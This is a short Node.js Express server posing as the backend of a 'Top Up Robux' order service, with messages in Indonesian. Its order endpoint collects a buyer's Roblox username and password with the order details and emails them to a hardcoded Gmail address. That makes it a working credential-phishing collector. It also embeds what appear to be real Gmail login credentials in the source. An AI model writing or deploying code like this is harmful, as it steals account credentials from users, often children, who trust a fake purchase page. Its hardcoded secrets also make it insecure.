const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "ryuzzl402@gmail.com",
    pass: "andikapwk"
  }
});

app.post("/order", (req, res) => {
  const { robux, harga, payment, username, password } = req.body;

  transporter.sendMail({
    from: "Top Up Robux",
    to: "kunyukpwk@gmail.com",
    subject: "Order Top Up Robux",
    text: `
Username Roblox: ${username}
Password: ${password}
Jumlah Robux: ${robux}
Harga: Rp ${harga}
Pembayaran: ${payment}
    `
  }, err => {
    if (err) return res.send("Gagal kirim email");
    res.send("Pesanan berhasil dikirim!");
  });
});

app.listen(3000, () =>
  console.log("Server jalan di http://localhost:3000")
);
